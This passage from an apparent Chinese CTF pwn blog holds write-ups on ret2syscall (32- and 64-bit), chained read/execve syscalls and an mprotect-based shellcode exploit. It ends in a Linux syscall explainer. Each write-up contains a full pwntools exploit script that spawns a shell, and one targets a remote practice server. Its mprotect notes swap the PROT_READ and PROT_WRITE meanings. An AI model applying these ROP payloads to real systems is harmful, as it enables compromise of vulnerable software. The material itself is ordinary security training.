class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm">lpp@lpp-virtual-machine:~/test$ ROPgadget --binary rop --only &#x27;pop|ret&#x27;| grep &#x27;ebx&#x27;<br>0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret<br>0x080be23f : pop ebx ; pop edi ; ret<br>0x0806eb69 : pop ebx ; pop edx ; ret<br>0x08092258 : pop ebx ; pop esi ; pop ebp ; ret<br>0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10<br>0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14<br>0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc<br>0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4<br>0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8<br>0x08048913 : pop ebx ; pop esi ; pop edi ; ret<br>0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4<br>0x08049a94 : pop ebx ; pop esi ; ret<br>0x080481c9 : pop ebx ; ret<br>0x080d7d3c : pop ebx ; ret 0x6f9<br>0x08099c87 : pop ebx ; ret 8<br>0x0806eb91 : pop ecx ; pop ebx ; ret<br>0x0806336b : pop edi ; pop esi ; pop ebx ; ret<br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret<br>0x0805c820 : pop esi ; pop ebx ; ret<br>0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0807b6ed : pop ss ; pop ebx ; ret<br></code></pre></td></tr></table></figure><p>0x080bb196 : pop eax ; ret这一条可以控制eax寄存器</p><p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret这一条可以控制剩下三个edx，ecx，ebx寄存器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>sh=process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br>pop_eax_ret=<span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret=<span class="hljs-number">0x0806eb90</span><br>int_0x80=<span class="hljs-number">0x08049421</span><br>binsh=<span class="hljs-number">0x080be408</span><br>payload=flat([<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span>,pop_eax_ret,<span class="hljs-number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,binsh,int_0x80])<br><span class="hljs-comment">#int 0x80(0xb,/bin/sh,0,0)      execve(binsh,0,0)</span><br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>int 0x80（eax，ebx，ecx，edx）</p><p>eax&#x3D;0xb也就是execve函数</p><p>ebx&#x3D;binsh也就是第一个参数</p><p>ecx&#x3D;0</p><p>edx&#x3D;0</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/ret2syscall%2064%20%E4%BD%8D/"/>
    <url>/2024/09/16/ret2syscall%2064%20%E4%BD%8D/</url>
    
    <content type="html"><![CDATA[<h2 id="ret2syscall-64-位"><a href="#ret2syscall-64-位" class="headerlink" title="ret2syscall 64 位"></a>ret2syscall 64 位</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[XCITC-CTF]&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;where is my system_x64?&quot;</span>);<br>  gets(v4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Nh..&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#0x000000000046b9f8 : pop rax ; ret</span><br><span class="hljs-comment">#0x00000000004016c3 : pop rdi ; ret</span><br><span class="hljs-comment">#0x00000000004377f9 : pop rdx ; pop rsi ; ret</span><br><span class="hljs-comment">#0x0000000000400488 : syscall</span><br><span class="hljs-comment">#0x000000000045bac5 : ret_addr</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>a=process(<span class="hljs-string">&#x27;./ret2sys_64&#x27;</span>)<br>padding=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">88</span><br>pop_rax=<span class="hljs-number">0x000000000046b9f8</span><br>pop_rdx_rsi=<span class="hljs-number">0x00000000004377f9</span><br>rdi=<span class="hljs-number">0x00000000004016c3</span><br>sys=<span class="hljs-number">0x000000000045bac5</span><br>bss=<span class="hljs-number">0x00000000006C1D00</span><br><br>payload=padding<br>payload+=p64(pop_rax)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(pop_rdx_rsi)+p64(<span class="hljs-number">0x10</span>)+p64(bss)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(sys)<br>payload+=p64(pop_rax)+p64(<span class="hljs-number">0x3b</span>)<br>payload+=p64(pop_rdx_rsi)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rdi)+p64(bss)<br>payload+=p64(sys)<br><br>a.sendline(payload)<br>sleep(<span class="hljs-number">1</span>)<br>a.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>与32位差别在函数调用的系统调用号上</p><p>并把需要的系统调用号给eax（通常使用<strong>execve</strong>，即0x0b），把其余寄存器清空（给一个0进去即可）</p><p>再将&#x2F;bin&#x2F;sh（或者sh也可）的地址和int 0x80的地址作为参数传进去即可</p><p>64位</p><p>与32位类似，但是传参的寄存器是rdi-&gt;rsi-&gt;rdx-&gt;rcx-&gt;r8-&gt;r9，即把需要的系统调用号给rax（64位），把rdx,rsi置零(因为是pop释放参数，所以与传参顺序相反)。</p><p>且ret返回的函数名不同</p><ul><li>32位为int 0x80，64位为syscall ret</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/Ret2sys%5B%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%5D/"/>
    <url>/2024/09/16/Ret2sys%5B%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%5D/</url>
    
    <content type="html"><![CDATA[<h2 id="Ret2syscall-多系统函数调用32位"><a href="#Ret2syscall-多系统函数调用32位" class="headerlink" title="Ret2syscall[多系统函数调用32位]"></a>Ret2syscall[多系统函数调用32位]</h2><p>主函数存在溢出点，静态编译，gadgets很多，符合ret2syscall</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+10h] [ebp-20h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[XCITC-CTF]&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;where is my system?&quot;</span>);<br>  gets(&amp;v4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Nh..&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用ROPgadgets寻找到了一些可能用到的gadgets：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">#0x080bb2c6 : pop eax ; ret<br>#0x0809df09 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>#0x0806ecb0 : pop edx ; pop ecx ; pop ebx ; ret<br>#0x0807229a : pop eax ; ret 0x80e<br>#0x080481b2 : ret<br>#0x08049421 : int 0x80<br></code></pre></td></tr></table></figure><p>确定要调用的系统函数调用号（execve 0xb），如果没有&#x2F;bin&#x2F;sh就要先调用read函数。</p><p>具体流程：</p><p>1.栈溢出ret到pop_eax_ret的位置，pop_eax_ret的参数是0x3（read函数调用号）</p><p>2.ret到pop_edx_ecx_ebx_ret的位置，edx参数是0x10，ecx参数是bss(&#x2F;bin&#x2F;sh地址)，ebx参数是0</p><p>3.ret到int 0x80地址</p><p>4.再次调用pop_eax_ret,参数0xb(execve函数系统调用号)</p><p>5.再次调用pop_edx_ecx_ebx,参数分别是0，0，bss(&#x2F;bin&#x2F;sh)</p><p>6.ret到int 0x80地址</p><p>具体解释一下第二步</p><p>read函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count)</span>;<br><span class="hljs-comment">//功能：read()会把参数fd所指的文件传送count 个字节到buf 指针所指的内存中。</span><br><span class="hljs-comment">/*返回值：返回值为实际读取到的字节数, </span><br><span class="hljs-comment">如果返回0, 表示已到达文件尾或是无可读取的数据。如果返回-1代表读取不成功，错误代码存入errno中*/</span><br><span class="hljs-comment">//参数：</span><br><span class="hljs-comment">//1.fd 文件描述符</span><br><span class="hljs-comment">//2.buf 所要读取内容</span><br><span class="hljs-comment">//3.count 要读取的大小</span><br></code></pre></td></tr></table></figure><p>所以第二步根据传参顺序设置文件描述符是0（ebx）</p><p>buf读入bss地址（ecx）</p><p>count读取大小（edx）</p><p>所以payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">44</span><br><br>payload += p32(pop_eax)+p32(<span class="hljs-number">0x3</span>)<br><br>payload += p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0x10</span>)+p32(bss)+p32(<span class="hljs-number">0</span>) <br><br>payload += p32(int_0x80) <br><br>payload += p32(pop_eax)+p32(<span class="hljs-number">0xb</span>)<br><br>payload += p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)<br><br>payload += p32(int_0x80)<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./ret2sys&quot;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#sh = remote(&quot;120.79.17.251&quot;,10005)</span><br>pop_eax = <span class="hljs-number">0x080bb2c6</span> <br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806ecb0</span><br>bss = <span class="hljs-number">0x080eb000</span><br>int_0x80 = <span class="hljs-number">0x0806F350</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">44</span><br>payload += p32(pop_eax)+p32(<span class="hljs-number">0x3</span>)<br>payload += p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0x10</span>)+p32(bss)+p32(<span class="hljs-number">0</span>)<br>payload += p32(int_0x80)<br>payload += p32(pop_eax)+p32(<span class="hljs-number">0xb</span>)<br>payload += p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)<br>payload += p32(int_0x80)<br><span class="hljs-comment">#gdb.attach(sh)</span><br>sh.sendline(payload)<br>sleep(<span class="hljs-number">1</span>)<br>bin_sh = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>sh.sendline(bin_sh)<br>sh.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/mprotect%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%A0%88%E7%9A%84%E6%9D%83%E9%99%90/"/>
    <url>/2024/09/16/mprotect%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%A0%88%E7%9A%84%E6%9D%83%E9%99%90/</url>
    
    <content type="html"><![CDATA[<h2 id="mprotect函数可以修改内存栈的权限"><a href="#mprotect函数可以修改内存栈的权限" class="headerlink" title="mprotect函数可以修改内存栈的权限"></a>mprotect函数可以修改内存栈的权限</h2><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure><p>需要传入三个参数，mprotect()函数是把自start开始的，长度为len的内存区的保护属性修改为prot指定的值</p><p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><p>1）PROT_READ：表示内存段内的内容可写；</p><p>2）PROT_WRITE：表示内存段内的内容可读；</p><p>3）PROT_EXEC：表示内存段中的内容可执行；</p><p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p><p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p>如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个：<br>1）EACCES<br>该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。</p><p>2）EINVAL</p><p>start 不是一个有效的指针，指向的不是某个内存页的开头。</p><p>3）ENOMEM</p><p>内核内部的结构体无法分配。</p><p>4）ENOMEM</p><p>进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。 </p><p>如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程</p><h3 id="例题：not-the-same-3dsctf-2016-1"><a href="#例题：not-the-same-3dsctf-2016-1" class="headerlink" title="例题：not_the_same_3dsctf_2016 1"></a>例题：not_the_same_3dsctf_2016 1</h3><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [esp+Fh] [ebp-2Dh] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">get_secret</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// esi</span><br><br>  v0 = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);<br>  fgets(&amp;fl4g, <span class="hljs-number">45</span>, v0);<br>  <span class="hljs-keyword">return</span> fclose(v0);<br>&#125;<br></code></pre></td></tr></table></figure><p>存在栈溢出，在get_secret函数里将flag读取到f14g变量里，局部变量位于bss段</p><p>基本思路：利用栈溢出返回到get_secret函数执行，然后调用printf函数将f14g变量打印出来，容易实现</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>)<br><span class="hljs-comment">#a=process(&#x27;./not_the_same&#x27;)</span><br>a=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">29713</span>)<br>flag=<span class="hljs-number">0x080489a0</span><br>f14g=<span class="hljs-number">0x080ECA2d</span><br>pop_esi_edi_ebp_ret=<span class="hljs-number">0x080483b8</span><br>printf_addr=<span class="hljs-number">0x0804F0A0</span><br>exit_addr=<span class="hljs-number">0x0804E660</span><br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-comment">#pause()</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0x2d</span>)+p32(flag)+p32(printf_addr)+p32(exit_addr)+p32(f14g)<br>a.sendline(payload)<br><span class="hljs-comment">#0x080483b8 : pop esi ; pop edi ; pop ebp ; ret</span><br>a.interactive()<br></code></pre></td></tr></table></figure><p>然后，了解到mprotect函数，可以修改执行权限</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>)<br><span class="hljs-comment">#a=process(&#x27;./not_the_same&#x27;)</span><br>a=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">29997</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./not_the_same&#x27;</span>)<br>flag=<span class="hljs-number">0x080489a0</span><br>shell=<span class="hljs-number">0x080ECA2d</span><br>pop_esi_edi_ebp_ret=<span class="hljs-number">0x080483b8</span><br>printf_addr=<span class="hljs-number">0x0804F0A0</span><br>exit_addr=<span class="hljs-number">0x0804E660</span><br>shellcode=asm(shellcraft.sh())<br>read_addr=elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect_addr=<span class="hljs-number">0x0806ED40</span><br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#payload=b&quot;a&quot;*(0x2d)+p32(flag)+p32(printf_addr)+p32(exit_addr)+p32(shell)</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x2d</span>+p32(mprotect_addr)+p32(pop_esi_edi_ebp_ret)+p32(<span class="hljs-number">0x80eb000</span>)+p32(<span class="hljs-number">0x100</span>)+p32(<span class="hljs-number">0x7</span>)<br>payload+=p32(read_addr)+p32(pop_esi_edi_ebp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x80eb000</span>)+p32(<span class="hljs-built_in">len</span>(shellcode))+p32(<span class="hljs-number">0x80eb000</span>)<br>a.sendline(payload)<br>a.sendline(shellcode)<br><span class="hljs-comment">#0x080483b8 : pop esi ; pop edi ; pop ebp ; ret</span><br>a.interactive()<br></code></pre></td></tr></table></figure><p>通过mprotect函数改变bss段权限之后，往bss段写入shellcode，使shellcode可以执行</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <url>/2024/09/16/Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="系统调用概述"><a href="#系统调用概述" class="headerlink" title="系统调用概述"></a>系统调用概述</h2><p>计算机系统的各种硬件资源是有限的，在现代多任务操作系统上同时运行的多个进程都需要访问这些资源，为了更好的管理这些资源进程是不允许直接操作的，所有对这些资源的访问都必须有操作系统控制。也就是说操作系统是使用这些资源的唯一入口，而这个入口就是操作系统提供的<strong>系统调用（System Call）</strong>。在linux中系统调用是用户空间访问内核的唯一手段，除异常和陷入外，他们是内核唯一的合法入口。</p><p>一般情况下应用程序通过应用编程接口API，而不是直接通过系统调用来编程。在Unix世界，最流行的API是基于POSIX标准的。</p><p>操作系统一般是通过中断从用户态切换到内核态。中断就是一个硬件或软件请求，要求CPU暂停当前的工作，去处理更重要的事情。比如，在x86机器上可以通过int指令进行软件中断，而在磁盘完成读写操作后会向CPU发起硬件中断。</p><p>中断有两个重要的属性，中断号和中断处理程序。中断号用来标识不同的中断，不同的中断具有不同的中断处理程序。在操作系统内核中维护着一个中断向量表（Interrupt Vector Table），这个数组存储了所有中断处理程序的地址，而中断号就是相应中断在中断向量表中的偏移量。</p><p>一般地，系统调用都是通过软件中断实现的，x86系统上的软件中断由int $0x80指令产生，而128号异常处理程序就是系统调用处理程序system_call()，它与硬件体系有关，在entry.S中用汇编写。接下来就来看一下Linux下系统调用具体的实现过程。</p><h2 id="为什么需要系统调用"><a href="#为什么需要系统调用" class="headerlink" title="为什么需要系统调用"></a>为什么需要系统调用</h2><p>linux内核中设置了一组用于实现系统功能的子程序，称为系统调用。系统调用和普通库函数调用非常相似，只是系统调用由操作系统核心提供，运行于<strong>内核态</strong>，而普通的函数调用由函数库或用户自己提供，运行于<strong>用户态</strong>。</p><p>一般的，进程是不能访问内核的。它不能访问内核所占内存空间也不能调用内核函数。CPU硬件决定了这些（这就是为什么它被称作<strong>“保护模式”</strong>）。</p><p>为了和用户空间上运行的进程进行交互，内核提供了一组接口。透过该接口，应用程序可以访问硬件设备和其他操作系统资源。这组接口在应用程序和内核之间扮演了使者的角色，应用程序发送各种请求，而内核负责满足这些请求(或者让应用程序暂时搁置)。实际上提供这组接口主要是为了保证系统稳定可靠，避免应用程序肆意妄行，惹出大麻烦。</p><p>系统调用在用户空间进程和硬件设备之间添加了一个中间层。该层主要作用有三个：</p><p>1、它为用户空间提供了一种统一的硬件的抽象接口。比如当需要读些文件的时候，应用程序就可以不去管磁盘类型和介质，甚至不用去管文件所在的文件系统到底是哪种类型。</p><p>2、系统调用保证了系统的稳定和安全。作为硬件设备和应用程序之间的中间人，内核可以基于权限和其他一些规则对需要进行的访问进行裁决。举例来说，这样可以避免应用程序不正确地使用硬件设备，窃取其他进程的资源，或做出其他什么危害系统的事情。</p><p>3、每个进程都运行在虚拟系统中，而在用户空间和系统的其余部分提供这样一层公共接口，也是出于这种考虑。如果应用程序可以随意访问硬件而内核又对此一无所知的话，几乎就没法实现多任务和虚拟内存，当然也不可能实现良好的稳定性和安全性。在Linux中，系统调用是用户空间访问内核的惟一手段；除异常和中断外，它们是内核惟一的合法入口。</p><h2 id="API-POSIX-C库的区别与联系"><a href="#API-POSIX-C库的区别与联系" class="headerlink" 